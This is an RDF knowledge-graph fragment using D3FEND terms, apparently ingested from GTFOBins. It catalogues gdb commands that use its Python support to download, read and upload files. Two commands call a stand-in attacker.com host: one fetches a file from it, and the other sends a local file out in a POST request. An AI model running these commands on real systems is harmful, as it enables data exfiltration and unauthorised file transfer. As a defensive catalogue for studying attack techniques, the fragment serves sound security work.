mknd:command_gdb-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "gdb-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request." ;
    d3f:uses mknd:executable_gdb ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_gdb ;
    mknd:provides mknd:function_file-download ;
    mknd:value """export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])' -ex quit
""" .

mknd:command_gdb-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "gdb-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This requires that GDB is compiled with Python support." ;
    d3f:uses mknd:executable_gdb ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_gdb ;
    mknd:provides mknd:function_file-read ;
    mknd:value "gdb -nx -ex 'python print(open(\"file_to_read\").read())' -ex quit" .

mknd:command_gdb-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "gdb-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This requires that GDB is compiled with Python support. Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
        "This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server." ;
    d3f:uses mknd:executable_gdb ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_gdb ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """export LPORT=8888
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit
""",
        """export URL=http://attacker.com/
export LFILE=file_to_send
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' -ex quit
""" .

